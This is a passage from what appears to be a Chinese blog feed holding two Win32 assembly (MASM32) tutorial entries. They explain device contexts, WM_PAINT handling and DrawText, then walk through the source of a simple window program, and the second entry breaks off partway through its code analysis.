<h2 id="理论："><a href="#理论：" class="headerlink" title="理论："></a>理论：</h2><h3 id="“绘制”字符串"><a href="#“绘制”字符串" class="headerlink" title="“绘制”字符串"></a>“绘制”字符串</h3><p>Windows 中的文本是一个GUI（图形用户界面）对象。每一个字符实际上是由许多的像素点组成，这些点在有笔画的地方显示出来，这样就会出现字符。这也是为什么我说“绘制”字符，而不是写字符。通常您都是在您应用程序的客户区“绘制”字符串（尽管您也可以在客户区外“绘制”）。Windows 下的“绘制”字符串方法和 Dos 下的截然不同，在 Dos 下，您可以把屏幕想象成 85 x 25 的一个平面，而 Windows 下由于屏幕上同时有几个应用程序的画面，所以您必须严格遵从规范。Windows 通过把每一个应用程序限制在他的客户区来做到这一点。当然客户区的大小是可变的，您随时可以调整。</p>
<p>在您在客户区“绘制”字符串前，您必须从 Windows 那里得到您客户区的大小，确实您无法像在 DOS 下那样随心所欲地在屏幕上任何地方“绘制”，绘制前您必须得到 Windows 的允许，然后 Windows 会告诉您客户区的大小，字体，颜色和其它 GUI 对象的属性。您可以用这些来在客户区“绘制”。</p>
<h3 id="设备环境"><a href="#设备环境" class="headerlink" title="设备环境"></a>设备环境</h3><p>什么是“设备环境”（DC）呢？ 它其实是由 Windows 内部维护的一个数据结构。一个“设备环境”和一个特定的设备相连。像打印机和显示器。对于显示器来说，“设备环境”和一个个特定的窗口相连。</p>
<p>“设备环境”中的有些属性和绘图有关，像：颜色，字体等。您可以随时改动那些缺省值，之所以保存缺省值是为了方便。您可以把“设备环境”想象成是Windows 为您准备的一个绘图环境，而您可以随时根据需要改变某些缺省属性。</p>
<p>当应用程序需要绘制时，您必须得到一个“设备环境”的句柄。通常有几种方法。</p>
<ul>
<li>在 <code>WM_PAINT</code> 消息中使用 <code>call BeginPaint</code></li>
<li>在其他消息中使用 <code>call GetDC</code></li>
<li><code>call CreateDC</code> 建立你自己的 DC</li>
</ul>
<p>您必须牢记的是，<strong>在处理单个消息后你必须释放“设备环境”句柄</strong>。不要在一个消息处理中获得 “设备环境”句柄，而在另一个消息处理中在释放它。</p>
<p>我们在Windows 发送 <code>WM_PAINT</code> 消息时处理绘制客户区，Windows 不会保存客户区的内容，它用的是方法是“重绘”机制（譬如当客户区刚被另一个应用程序的客户区覆盖），Windows 会把 <code>WM_PAINT</code> 消息放入该应用程序的消息队列。重绘窗口的客户区是各个窗口自己的责任，您要做的是在窗口过程处理 WM_PAINT 的部分知道绘制什么和何如绘制。 </p>
<p>您必须了解的另一个概念是“无效区域”。Windows 把一个最小的需要重绘的正方形区域叫做“无效区域”。当 Windows 发现了一个”无效区域“后，它就会向该应用程序发送一个 <code>WM_PAINT</code> 消息，在 <code>WM_PAINT</code> 的处理过程中，窗口首先得到一个有关绘图的结构体，里面包括无效区的坐标位置等。您可以通过调用 <code>BeginPaint</code> 让“无效区”有效，<strong>如果您不处理 <code>WM_PAINT</code> 消息，至少要调用缺省的窗口处理函数 <code>DefWindowProc</code> ，或者调用 <code>ValidateRect</code> 让“无效区”有效。否则您的应用程序将会收到无穷无尽的 <code>WM_PAINT</code> 消息。</strong></p>
<p>下面是响应该消息的步骤： </p>
<ol>
<li>取得“设备环境”句柄 </li>
<li>绘制客户区 </li>
<li>释放“设备环境”句柄 </li>
</ol>
<p>注意，您无须显式地让“无效区”有效，这个动作由 <code>BeginPaint</code> 自动完成。您可以在 <code>BeginPaint</code> 和 <code>Endpaint</code> 之间，调用所有的绘制函数。几乎所有的 GDI 函数都需要“设备环境”的句柄作为参数。</p>
<h2 id="内容："><a href="#内容：" class="headerlink" title="内容："></a>内容：</h2><p>我们将写一个应用程序，它会在客户区的中心显示一行 “Win32 汇编非常有意思”</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div></pre></td><td class="code"><pre><div class="line">.386 </div><div class="line">.model flat,stdcall </div><div class="line">option casemap:none </div><div class="line"></div><div class="line">WinMain proto :DWORD,:DWORD,:DWORD,:DWORD </div><div class="line"></div><div class="line">include \masm32\include\windows.inc </div><div class="line">include \masm32\include\user32.inc </div><div class="line">includelib \masm32\lib\user32.lib </div><div class="line">include \masm32\include\kernel32.inc </div><div class="line">includelib \masm32\lib\kernel32.lib </div><div class="line"></div><div class="line">.DATA </div><div class="line">ClassName db &quot;SimpleWinClass&quot;,0 </div><div class="line">AppName  db &quot;Our Second Window&quot;,0 </div><div class="line">OurText  db &quot;Win32 汇编非常有意思&quot;,0 </div><div class="line"></div><div class="line">.DATA? </div><div class="line">hInstance HINSTANCE ? </div><div class="line">CommandLine LPSTR ? </div><div class="line"></div><div class="line">.CODE </div><div class="line">start: </div><div class="line">    invoke GetModuleHandle, NULL </div><div class="line">    mov    hInstance,eax </div><div class="line">    invoke GetCommandLine</div><div class="line">    mov CommandLine,eax</div><div class="line">    invoke WinMain, hInstance,NULL,CommandLine, SW_SHOWDEFAULT </div><div class="line">    invoke ExitProcess,eax </div><div class="line"></div><div class="line">WinMain proc hInst:HINSTANCE, hPrevInst:HINSTANCE, CmdLine:LPSTR, CmdShow:DWORD </div><div class="line">    LOCAL wc:WNDCLASSEX </div><div class="line">    LOCAL msg:MSG </div><div class="line">    LOCAL hwnd:HWND </div><div class="line">    mov   wc.cbSize,SIZEOF WNDCLASSEX </div><div class="line">    mov   wc.style, CS_HREDRAW or CS_VREDRAW </div><div class="line">    mov   wc.lpfnWndProc, OFFSET WndProc </div><div class="line">    mov   wc.cbClsExtra,NULL </div><div class="line">    mov   wc.cbWndExtra,NULL </div><div class="line">    push  hInst </div><div class="line">    pop   wc.hInstance </div><div class="line">    mov   wc.hbrBackground,COLOR_WINDOW+1 </div><div class="line">    mov   wc.lpszMenuName,NULL </div><div class="line">    mov   wc.lpszClassName,OFFSET ClassName </div><div class="line">    invoke LoadIcon,NULL,IDI_APPLICATION </div><div class="line">    mov   wc.hIcon,eax </div><div class="line">    mov   wc.hIconSm,eax </div><div class="line">    invoke LoadCursor,NULL,IDC_ARROW </div><div class="line">    mov   wc.hCursor,eax </div><div class="line">    invoke RegisterClassEx, addr wc </div><div class="line">    invoke CreateWindowEx,NULL,ADDR ClassName,ADDR AppName,\ </div><div class="line">           WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,\ </div><div class="line">           CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,NULL,NULL,\ </div><div class="line">           hInst,NULL </div><div class="line">    mov   hwnd,eax </div><div class="line">    invoke ShowWindow, hwnd,SW_SHOWNORMAL </div><div class="line">    invoke UpdateWindow, hwnd </div><div class="line">        .WHILE TRUE </div><div class="line">                invoke GetMessage, ADDR msg,NULL,0,0 </div><div class="line">                .BREAK .IF (!eax) </div><div class="line">                invoke TranslateMessage, ADDR msg </div><div class="line">                invoke DispatchMessage, ADDR msg </div><div class="line">        .ENDW </div><div class="line">        mov     eax,msg.wParam </div><div class="line">        ret </div><div class="line">WinMain endp </div><div class="line"></div><div class="line">WndProc proc hWnd:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM </div><div class="line">    LOCAL hdc:HDC </div><div class="line">    LOCAL ps:PAINTSTRUCT </div><div class="line">    LOCAL rect:RECT </div><div class="line">    .IF uMsg==WM_DESTROY </div><div class="line">        invoke PostQuitMessage,NULL </div><div class="line">    .ELSEIF uMsg==WM_PAINT </div><div class="line">        invoke BeginPaint,hWnd, ADDR ps </div><div class="line">        mov    hdc,eax </div><div class="line">        invoke GetClientRect,hWnd, ADDR rect </div><div class="line">        invoke DrawText, hdc,ADDR OurText,-1, ADDR rect, \ </div><div class="line">                DT_SINGLELINE or DT_CENTER or DT_VCENTER </div><div class="line">        invoke EndPaint,hWnd, ADDR ps </div><div class="line">    .ELSE </div><div class="line">        invoke DefWindowProc,hWnd,uMsg,wParam,lParam </div><div class="line">        ret </div><div class="line">    .ENDIF </div><div class="line">    xor   eax, eax </div><div class="line">    ret </div><div class="line">WndProc endp </div><div class="line">end start</div></pre></td></tr></table></figure>
<h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><p>这里的大多数代码和<code>Win32汇编学习(3)：简单的窗口</code>中的一样。我只解释其中一些不相同的地方。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">LOCAL hdc：HDC</div><div class="line">LOCAL ps：PAINTSTRUCT</div><div class="line">LOCAL rect：RECT</div></pre></td></tr></table></figure>
<p>这些局部变量由处理 <code>WM_PAINT</code> 消息中的 GDI 函数调用。<code>hdc</code> 用来存放调用 <code>BeginPaint</code> 返回的“设备环境”句柄。<code>ps</code> 是一个 <code>PAINTSTRUCT</code> 数据类型的变量。通常您不会用到其中的许多值，它由 Windows 传递给 <code>BeginPaint</code>，在结束绘制后再原封不动的传递给 <code>EndPaint</code>。<code>rect</code> 是一个 <code>RECT</code> 结构体类型参数，它的定义如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">RECT Struct left LONG ?</div><div class="line">top LONG ?</div><div class="line">right LONG ?</div><div class="line">bottom LONG ?</div><div class="line">RECT ends</div></pre></td></tr></table></figure>
<p>left 和 top 是正方形左上角的坐标。right 和 bottom 是正方形右下角的坐标。客户区的左上角的坐标是 x=0，y=0，这样对于 x=0，y=10 的坐标点就在它的下面。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">invoke BeginPaint，hWnd， ADDR ps</div><div class="line">mov hdc，eax</div><div class="line">invoke GetClientRect，hWnd， ADDR rect</div><div class="line">invoke DrawText， hdc，ADDR OurText，-1， ADDR rect， \ </div><div class="line">DT_SINGLELINE or DT_CENTER or DT_VCENTER</div><div class="line">invoke EndPaint，hWnd， ADDR ps</div></pre></td></tr></table></figure>
<p>在处理 <code>WM_PAINT</code> 消息时，您调用<code>BeginPaint</code>函数，传给它一个窗口句柄和未初始化的 <code>PAINTSTRUCT</code> 型参数。调用成功后在 eax 中返回“设备环境”的句柄。下一次，调用 <code>GetClientRect</code> 以得到客户区的大小，大小放在 <code>rect</code> 中，然后把它传给 <code>DrawText</code>。<code>DrawText</code> 的语法如下： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">DrawText proto hdc：HDC， lpString：DWORD， nCount：DWORD， lpRect：DWORD， uFormat：DWORD</div></pre></td></tr></table></figure>
<p><code>DrawText</code>是一个高层的调用函数。它能自动处理像换行、把文本放到客户区中间等这些杂事。所以您只管集中精力“绘制”字符串就可以了。让我们来看一看该函数的参数： </p>
<ul>
<li><code>hdc</code>： “设备环境”的句柄。 </li>
<li><code>lpString</code>：要显示的文本串，该文本串要么以NULL结尾，要么在nCount中指出它的长短。 </li>
<li><code>nCount</code>：要输出的文本的长度。若以NULL结尾，该参数必须是-1。 </li>
<li><code>lpRect</code>： 指向要输出文本串的正方形区域的指针，该方形必须是一个裁剪区，也就是说超过该区域的字符将不能显示。 </li>
<li><code>uFormat</code>：指定如何显示。我们可以用 or 把以下标志或到一块： <ul>
<li>DT_SINGLELINE：是否单行显示。 </li>
<li>DT_CENTER：是否水平居中。 </li>
<li>DT_VCENTER ：是否垂直居中。 </li>
</ul>
</li>
</ul>
<p>结束绘制后，必须调用 <code>EndPaint</code> 释放“设备环境”的句柄。 好了，现在我们把“绘制”文本串的要点总结如下：</p>
<ol>
<li>必须在开始和结束处分别调用 <code>BeginPaint</code> 和 <code>EndPaint</code>； </li>
<li>在 <code>BeginPaint</code> 和 <code>EndPaint</code> 之间调用所有的绘制函数； </li>
<li>如果在其它的消息处理中重新绘制客户区，您可以有两种选择：<ul>
<li>用<code>GetDC</code>和<code>ReleaseDC</code>代替<code>BeginPaint</code>和<code>EndPaint</code>；</li>
<li>调用<code>InvalidateRect</code>或<code>UpdateWindow</code>让客户区无效，这将迫使WINDOWS把<code>WM_PAINT</code>放入应用程序消息队列，从而使得客户区重绘。</li>
</ul>
</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次，我们将学习如何在窗口的客户区“绘制”字符串。我们还将学习关于“设备环境”的概念。&lt;br&gt;
    
    </summary>
    
      <category term="汇编(ASM)" scheme="http://hacktech.cn/categories/%E6%B1%87%E7%BC%96-ASM/"/>
    
    
      <category term="ASM" scheme="http://hacktech.cn/tags/ASM/"/>
    
      <category term="读书笔记" scheme="http://hacktech.cn/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
      <category term="Windows" scheme="http://hacktech.cn/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>Win32汇编学习(3)：简单的窗口</title>
    <link href="http://hacktech.cn/2018/02/06/Win32%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0-3-%EF%BC%9A%E7%AE%80%E5%8D%95%E7%9A%84%E7%AA%97%E5%8F%A3.html"/>
    <id>http://hacktech.cn/2018/02/06/Win32汇编学习-3-：简单的窗口.html</id>
    <published>2018-02-06T13:12:50.000Z</published>
    <updated>2018-04-10T13:26:27.013Z</updated>
    
    <content type="html"><![CDATA[<p>这次我们将写一个 Windows 程序，它会在桌面显示一个标准的窗口，以此根据代码来学习如何创建一个简单的窗口。<br><a id="more"></a></p>
<h2 id="理论："><a href="#理论：" class="headerlink" title="理论："></a>理论：</h2><p>Windows 程序中，在写图形用户界面时需要调用大量的标准 Windows Gui 函数。其实这对用户和程序员来说都有好处，对于用户，面对的是同一套标准的窗口，对这些窗口的操作都是一样的，所以使用不同的应用程序时无须重新学习操作。对程序员来说，这些 Gui 源代码都是经过了微软的严格测试，随时拿来就可以用的。当然至于具体地写程序对于程序员来说还是有难度的。为了创建基于窗口的应用程序，必须严格遵守规范。做到这一点并不难，只要用模块化或面向对象的编程方法即可。</p>
<p>下面我就列出在桌面显示一个窗口的几个步骤：</p>
<ol>
<li>得到您应用程序的句柄(必需)； </li>
<li>得到命令行参数(如果您想从命令行得到参数，可选)； </li>
<li>注册窗口类(必需，除非您使用 Windows 预定义的窗口类，如 MessageBox 或 dialog box； </li>
<li>产生窗口(必需)； </li>
<li>在桌面显示窗口(必需，除非您不想立即显示它)； </li>
<li>刷新窗口客户区； </li>
<li>进入无限的获取窗口消息的循环； </li>
<li>如果有消息到达，由负责该窗口的窗口回调函数处理； </li>
<li>如果用户关闭窗口，进行退出处理。 </li>
</ol>
<p>相对于单用户的 DOS 下的编程来说，Windows 下的程序框架结构是相当复杂的。但是 Windows 和 DOS 在系统架构上是截然不同的。Windows 是一个多任务的操作系统，故系统中同时有多个应用程序彼此协同运行。这就要求 Windows 程序员必须严格遵守编程规范，并养成良好的编程风格。</p>
<h2 id="内容："><a href="#内容：" class="headerlink" title="内容："></a>内容：</h2><p>下面是我们简单的窗口程序的源代码。在进入复杂的代码前，指出几点要点：</p>
<ul>
<li>您应当把程序中要用到的所有常量和结构体的声明放到一个头文件中，并且在源程序的开始处包含这个头文件。这么做将会节省您大量的时间，也免得一次又一次的敲键盘。目前，我所使用的是<a href="http://masm32.com/" target="_blank" rel="external">masm32.com</a>提供的。您也可以定义您自己的常量和结构体，但最好把它们放到独立的头文件中 </li>
<li>用 includelib 指令，包含您的程序要引用的库文件，譬如：若您的程序要调用 “MessageBox”， 您就应当在源文件中加入如下一行： includelib user32.lib 这条语句告诉 MASM 您的程序将要用到一些引入库。如果您不止引用一个库，只要简单地加入 includelib 语句，不要担心链接器如何处理这么多的库，只要在链接时用链接开关 /LIBPATH 指明库所在的路径即可。 </li>
<li>在其它地方运用头文件中定义函数原型，常数和结构体时，要严格保持和头文件中的定义一致，包括大小写。在查询函数定义时，这将节约您大量的时间； </li>
<li>在编译，链接时用makefile文件，免去重复敲键。 </li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div></pre></td><td class="code"><pre><div class="line">.386 </div><div class="line">.model flat,stdcall </div><div class="line">option casemap:none </div><div class="line">include windows.inc </div><div class="line">include user32.inc </div><div class="line">includelib user32.lib            ; calls to functions in user32.lib and kernel32.lib </div><div class="line">include kernel32.inc </div><div class="line">includelib kernel32.lib </div><div class="line"></div><div class="line">WinMain proto :DWORD,:DWORD,:DWORD,:DWORD </div><div class="line"></div><div class="line">.DATA                     ; initialized data </div><div class="line">ClassName db &quot;SimpleWinClass&quot;,0        ; the name of our window class </div><div class="line">AppName db &quot;Our First Window&quot;,0        ; the name of our window </div><div class="line"></div><div class="line">.DATA?                ; Uninitialized data </div><div class="line">hInstance HINSTANCE ?        ; Instance handle of our program </div><div class="line">CommandLine LPSTR ? </div><div class="line">.CODE                ; Here begins our code </div><div class="line">start: </div><div class="line">invoke GetModuleHandle, NULL            ; get the instance handle of our program. </div><div class="line">                                                                       ; Under Win32, hmodule==hinstance mov hInstance,eax </div><div class="line">mov hInstance,eax </div><div class="line">invoke GetCommandLine                        ; get the command line. You don&apos;t have to call this function IF </div><div class="line">                                                                       ; your program doesn&apos;t process the command line. </div><div class="line">mov CommandLine,eax </div><div class="line">invoke WinMain, hInstance,NULL,CommandLine, SW_SHOWDEFAULT        ; call the main function </div><div class="line">invoke ExitProcess, eax                           ; quit our program. The exit code is returned in eax from WinMain. </div><div class="line"></div><div class="line">WinMain proc hInst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD </div><div class="line">    LOCAL wc:WNDCLASSEX                                            ; create local variables on stack </div><div class="line">    LOCAL msg:MSG </div><div class="line">    LOCAL hwnd:HWND </div><div class="line"></div><div class="line">    mov   wc.cbSize,SIZEOF WNDCLASSEX                   ; fill values in members of wc </div><div class="line">    mov   wc.style, CS_HREDRAW or CS_VREDRAW </div><div class="line">    mov   wc.lpfnWndProc, OFFSET WndProc </div><div class="line">    mov   wc.cbClsExtra,NULL </div><div class="line">    mov   wc.cbWndExtra,NULL </div><div class="line">    push  hInstance </div><div class="line">    pop   wc.hInstance </div><div class="line">    mov   wc.hbrBackground,COLOR_WINDOW+1 </div><div class="line">    mov   wc.lpszMenuName,NULL </div><div class="line">    mov   wc.lpszClassName,OFFSET ClassName </div><div class="line">    invoke LoadIcon,NULL,IDI_APPLICATION </div><div class="line">    mov   wc.hIcon,eax </div><div class="line">    mov   wc.hIconSm,eax </div><div class="line">    invoke LoadCursor,NULL,IDC_ARROW </div><div class="line">    mov   wc.hCursor,eax </div><div class="line">    invoke RegisterClassEx, addr wc                       ; register our window class </div><div class="line">    invoke CreateWindowEx,NULL,\ </div><div class="line">                ADDR ClassName,\ </div><div class="line">                ADDR AppName,\ </div><div class="line">                WS_OVERLAPPEDWINDOW,\ </div><div class="line">                CW_USEDEFAULT,\ </div><div class="line">                CW_USEDEFAULT,\ </div><div class="line">                CW_USEDEFAULT,\ </div><div class="line">                CW_USEDEFAULT,\ </div><div class="line">                NULL,\ </div><div class="line">                NULL,\ </div><div class="line">                hInst,\ </div><div class="line">                NULL </div><div class="line">    mov   hwnd,eax </div><div class="line">    invoke ShowWindow, hwnd,CmdShow               ; display our window on desktop </div><div class="line">    invoke UpdateWindow, hwnd                                 ; refresh the client area </div><div class="line"></div><div class="line">    .WHILE TRUE                                                         ; Enter message loop </div><div class="line">                invoke GetMessage, ADDR msg,NULL,0,0 </div><div class="line">                .BREAK .IF (!eax) </div><div class="line">                invoke TranslateMessage, ADDR msg </div><div class="line">                invoke DispatchMessage, ADDR msg </div><div class="line">   .ENDW </div><div class="line">    mov     eax,msg.wParam                                            ; return exit code in eax </div><div class="line">    ret </div><div class="line">WinMain endp </div><div class="line"></div><div class="line">WndProc proc hWnd:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM </div><div class="line">    .IF uMsg==WM_DESTROY                           ; if the user closes our window </div><div class="line">        invoke PostQuitMessage,NULL             ; quit our application </div><div class="line">    .ELSE </div><div class="line">        invoke DefWindowProc,hWnd,uMsg,wParam,lParam     ; Default message processing </div><div class="line">        ret </div><div class="line">    .ENDIF </div><div class="line">    xor eax,eax </div><div class="line">    ret </div><div class="line">WndProc endp </div><div class="line"></div><div class="line">end start</div></pre></td></tr></table></figure>
<h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><p>看到一个简单的 Windows 程序有这么多行，您是不是有点想死? 但是您必须要知道的是上面的大多数代码都是模板而已，模板的意思即是指这些代码对差不多所有标准 Windows 程序来说都是相同的。在写 Windows 程序时您可以把这些代码拷来拷去，当然把这些重复的代码写到一个库中也挺好。其实真正要写的代码集中在 WinMain 中。这和一些 C 编译器一样，无须要关心其它杂务，集中精力于 WinMain 函数。<strong>唯一不同的是 C 编译器要求您的源代码有必须有一个函数叫 WinMain。否则 C 无法知道将哪个函数和有关的前后代码链接。相对C，汇编语言提供了较大的灵活性，它不强行要求一个叫 WinMain 的函数。</strong></p>
<p>做好心理准备，下面我们开始分析代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">.386</div><div class="line">.model flat，stdcall</div><div class="line">option casemap：none</div><div class="line"></div><div class="line">WinMain proto ：DWORD，：DWORD，：DWORD，：DWORD</div><div class="line"></div><div class="line">include windows.inc</div><div class="line">include user32.inc</div><div class="line">include kernel32.inc</div><div class="line">includelib user32.lib</div><div class="line">includelib kernel32.lib</div></pre></td></tr></table></figure>
<p>您可以把前三行看成是”必须”的.</p>
<p><code>.386</code>告诉MASN我们要用80386指令集。<br><code>. model flat，stdcall</code>告诉MASM 我们用的内存寻址模式，此处也可以加入stdcall告诉MASM我们所用的参数传递约定。  </p>
<p>接下来是函数 WinMain 的原型声明，因为我们稍后要用到该函数，故必须先声明。我们必须包含 window.inc 文件，因为其中包含大量要用到的常量和结构的定义，该文件是一个文本文件，您可以用任何文本编辑器打开并且查看它</p>
<p>我们的程序调用 user32.dll (譬如：CreateWindowEx， RegisterWindowClassEx) 和 kernel32.dll (ExitProcess)中的函数，所以必须链接这两个库。接下来我如果问：您需要把什么库链入您的程序呢 ? 答案是：先查到您要调用的函数在什么库中，然后包含进来。譬如：若您要调用的函数在 gdi32.dll 中，您就要包含gdi32.inc头文件。和 MASM 相比，TASM 则要简单得多，您只要引入一个库，即：import32.lib。&lt;但 Tasm5 麻烦的是 windows.inc 非常的不全面，而且如果在 Windows.inc 中包含全部的 API 定义会内存不够，所以每次你得把用到的 API 定义拷贝出来&gt;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">.DATA</div><div class="line"></div><div class="line">ClassName db &quot;SimpleWinClass&quot;，0 </div><div class="line">AppName db &quot;Our First Window&quot;，0</div><div class="line"></div><div class="line">.DATA?</div><div class="line"></div><div class="line">hInstance HINSTANCE ?</div><div class="line">CommandLine LPSTR ?</div></pre></td></tr></table></figure>
<p>接下来是<code>DATA</code>“分段”。 在 .DATA 中我们定义了两个以 NULL 结尾的字符串 (ASCIIZ)：其中 ClassName 是 Windows 类名，AppName 是我们窗口的名字。这两个变量都是初始化了的。未进行初始化的两个变量放在 <code>.DATA?</code> “分段”中，其中 hInstance 代表应用程序的句柄，CommandLine 保存从命令行传入的参数。HINSTACE 和 LPSTR 是两个数据类型名，它们在头文件中定义，可以看做是 DWORD 的别名，之所以要这么重新定仅是为了易记。您可以查看 windows.inc 文件，在 .DATA? 中的变量都是未经初始化的，这也就是说在程序刚启动时它们的值是什么无关紧要，只不过占有了一块内存，以后可以再利用而已。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">.CODE</div><div class="line">start：</div><div class="line">invoke GetModuleHandle， NULL</div><div class="line">mov hInstance，eax</div><div class="line">invoke GetCommandLine</div><div class="line">mov CommandLine，eax</div><div class="line">invoke WinMain， hInstance，NULL，CommandLine， SW_SHOWDEFAULT</div><div class="line">invoke ExitProcess，eax</div><div class="line">.....</div><div class="line">end start</div></pre></td></tr></table></figure>
<p><code>.CODE</code> “分段”包含了您应用程序的所有代码，这些代码必须都在 .code 和 end 之间。至于 label 的命名只要遵从 Windows 规范而且保证唯一则具体叫什么倒是无所谓。我们程序的第一条语句是调用 GetModuleHandle 去查找我们应用程序的句柄。在Win32下，应用程序的句柄和模块的句柄是一样的。您可以把实例句柄看成是您的应用程序的 ID 号。我们在调用几个函数是都把它作为参数来进行传递，所以在一开始便得到并保存它就可以省许多的事。</p>
<p>特别注意：WIN32下的实例句柄实际上是您应用程序在内存中的线性地址。</p>
<p><strong>WIN32 中函数的函数如果有返回值，那它是通过 eax 寄存器来传递的。其他的值可以通过传递进来的参数地址进行返回。</strong>一个 WIN32 函数被调用时总会保存好段寄存器和 ebx，edi，esi和ebp 寄存器，而 ecx和edx 中的值总是不定的，不能在返回时应用。特别注意：从 Windows API 函数中返回后，eax，ecx，edx 中的值和调用前不一定相同。当函数返回时，返回值放在eax中。如果您应用程序中的函数提供给 Windows 调用时，也必须遵守这一点，即在函数入口处保存段寄存器和 ebx，esp，esi，edi 的值并在函数返回时恢复。如果不这样一来的话，您的应用程序很快会崩溃。从您的程序中提供给 Windows 调用的函数大体上有两种：Windows 窗口过程和 Callback 函数。</p>
<p>如果您的应用程序不处理命令行那么就无须调用 GetCommandLine，这里只是告诉您如果要调用应该怎么做。 </p>
<p>下面则是调用WinMain了。该函数共有4个参数：应用程序的实例句柄，该应用程序的前一实例句柄，命令行参数串指针和窗口如何显示。Win32 没有前一实例句柄的概念，所以第二个参数总为0。之所以保留它是为了和 Win16 兼容的考虑，在 Win16下，如果 hPrevInst 是 NULL，则该函数是第一次运行。特别注意：您不用必须声明一个名为 WinMain 函数，事实上在这方面您可以完全作主，您甚至无须有一个和 WinMain 等同的函数。您只要把 WinMain 中的代码拷到GetCommandLine 之后，其所实现的功能完全相同。在 WinMain 返回时，把返回码放到 eax 中。然后在应用程序结束时通过 ExitProcess 函数把该返回码传递给 Windows 。 </p>
